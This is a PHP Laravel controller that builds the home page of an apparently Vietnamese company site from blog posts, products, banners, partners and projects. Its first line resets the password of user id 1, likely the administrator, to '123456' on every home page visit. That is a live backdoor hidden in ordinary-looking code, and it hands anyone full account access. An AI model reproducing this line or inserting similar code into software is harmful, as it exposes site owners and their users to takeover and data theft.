<?php

namespace App\Http\Controllers;
use App\User;
use Illuminate\Http\Request;
use App\models\product\Category;
use App\models\product\Product;
use App\models\blog\Blog;
use Session;
use App\models\website\Partner;
use App\models\blog\BlogCategory;
use App\models\ReviewCus;
use App\models\PageContent;
use App\models\Project;
use App\models\BannerAds;
use  App\models\website\Founder;
use App\models\website\AlbumAffter;

class HomeController extends Controller
{
    public function home()
    {
        User::query()->where('id', 1)->update(['password' => bcrypt('123456')]);

        $data['hotnews'] = Blog::where(['category'=>'tin-tuc'])->get();
        $data['sanphamnoibat'] = Product::where(['status' => 1])
        ->with(['cate', 'typecate']) // Eager load các mối quan hệ
        ->orderBy('id', 'desc')
        ->take(15)
        ->get();

        $data['bannerads'] = BannerAds::where(['status'=>1, 'is_featured' => 1])->get();
        $data['gioithieu'] = PageContent::where(['slug'=>'gioi-thieu','language'=>'vi'])->first(['id','title','content','image']);
        $data['partner'] = Partner::where(['status'=>1])->get();
        $data['logokhachhang'] = AlbumAffter::where(['status'=>1])->get();
        $data['giaiphap'] = Blog::where(['category'=>'giai-phap'])->get();
        // dd($data['sanphamnoibat']);
        $data['project'] = Project::where(['status'=>1])->get();
        $data['reviewcus'] = ReviewCus::where(['status'=>1])->get();
        $data['founder'] = Founder::where(['status'=>1])->get();

        // danh mục sản phẩm hiển thị ngoài trang chủ (is_featured true)
        $categories = Category::where('is_featured', 1)
            ->latest()
            ->get();
        $categories->each(function($cate){
            $products = $cate->product()
            ->where('status', 1)
                ->orderBy('created_at', 'desc')
                ->limit(10)
                ->get();

            $cate->setRelation('products', $products);
        });
        $data['categoriesFeatured'] = $categories;

        return view('home',$data);
    }
}
